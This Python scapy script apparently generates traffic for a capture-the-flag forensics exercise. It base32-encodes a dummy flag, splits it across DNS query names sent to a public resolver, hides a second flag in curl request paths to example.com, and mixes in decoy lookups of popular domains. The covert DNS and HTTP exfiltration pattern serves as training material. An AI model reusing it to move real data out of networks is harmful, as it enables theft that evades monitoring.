from scapy.all import *
import base64
import random
import time
import os

from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IP, UDP

DNS_SERVER = "8.8.8.8"
HTTP_TARGET = "http://example.com"

DNS_FLAG = "flag{dns_split_success}"
HTTP_FLAG = "flag{http_path_success}"

encoded_flag = base64.b32encode(DNS_FLAG.encode()).decode().strip("=")


chunk_size = len(encoded_flag) // 3
dns_chunks = [
    encoded_flag[:chunk_size],
    encoded_flag[chunk_size:2*chunk_size],
    encoded_flag[2*chunk_size:]
]

NORMAL_DOMAINS = [
    "google.com",
    "mozilla.org",
    "example.com",
    "openai.com"
]

def send_dns(domain):
    pkt = IP(dst=DNS_SERVER)/UDP(
        sport=random.randint(1024,65535),
        dport=53
    )/DNS(
        rd=1,
        qd=DNSQR(qname=domain)
    )
    send(pkt, verbose=0)
    print(f"[DNS] Sent: {domain}")

def send_dns_flag_chunks():
    for part in dns_chunks:
        domain = f"{part}.ctf.local"
        send_dns(domain)
        time.sleep(0.7)

def send_http(normal=True):
    if normal:
        os.system(f"curl -s {HTTP_TARGET} > /dev/null")
    else:
        os.system(f"curl -s {HTTP_TARGET}/{HTTP_FLAG} > /dev/null")

try:
    while True:
        # Normal DNS traffic
        for _ in range(3):
            send_dns(random.choice(NORMAL_DOMAINS))
            time.sleep(random.uniform(0.5, 1.2))

        # DNS flag exfiltration
        send_dns_flag_chunks()

        # Normal + flagged HTTP
        if random.random() < 0.8:
            send_http(normal=True)
        else:
            send_http(normal=False)

        time.sleep(random.uniform(1, 3))

except KeyboardInterrupt:
    print("\n[+] Traffic stopped")